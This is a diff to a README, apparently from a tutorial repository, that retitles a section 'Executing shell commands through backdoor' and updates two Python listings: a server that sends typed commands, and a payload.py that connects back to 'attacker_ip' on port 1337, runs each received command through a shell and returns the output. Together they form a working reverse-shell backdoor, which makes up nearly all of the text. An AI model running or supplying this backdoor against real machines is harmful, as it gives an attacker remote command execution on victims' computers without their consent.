@@ -1,4 +1,4 @@
-<h2 align="center">Server-Client Communication</h2>
+<h2 align="center">Executing shell commands through backdoor</h2>
 <p align="center"><img width="350" height="350" src="./src/banner_cnph.gif"></p>
 
 - - - - - - - - - - - - - - - - - - - - - -
@@ -18,12 +18,20 @@ connection, address = listener.accept()
 print(f"Connected to {address}")
 
 while True:
-	## continuously send commands to be executed in client machine
-	cmd = input("enter a command: ") # string input	
-	connection.send(bytes(cmd, "utf-8")) # typecasted and converted into bytes
+	cmd = input("enter a command: ")
 	
-	output = connection.recv(2048) # receive the output from client machine
-	print(output.decode("utf-8")) # display decoded bytes into string
+	## if you want to quit and close the connection
+	if cmd == "quit":
+		connection.send(b"quit") # send quit message in bytes
+		connection.close()	# close the connection
+		break				# break the loop to stop
+		
+	connection.send(bytes(cmd, "utf-8")) 
+	
+	output = connection.recv(2048)
+	print(output.decode("utf-8"))
+
+print("Server has stopped")
 ```
 ---
 > [payload.py](payload.py)
@@ -38,9 +46,16 @@ payload.connect(("attacker_ip", 1337))
 print("Connected")
 
 while True:
-	## continuously receive command data
-	cmd = payload.recv(2048) # 1024 is approximately 1K bytes, 2048 is 2K bytes of data
-	cmd = cmd.decode("utf-8") # decode bytes into string
-	output = subprocess.check_output(cmd, shell = True) # store output in a variable
-	payload.send(output) # output should be sent back to server machine
+	cmd = payload.recv(2048)
+	
+	## if you want to quit and close the connection
+	if cmd == b"quit":
+		payload.close() # close the connection
+		break			# break the loop to stop
+		
+	cmd = cmd.decode("utf-8")
+	output = subprocess.check_output(cmd, shell = True)
+	payload.send(output)
+
+print("Disconnected") # display disconnection message
 ```
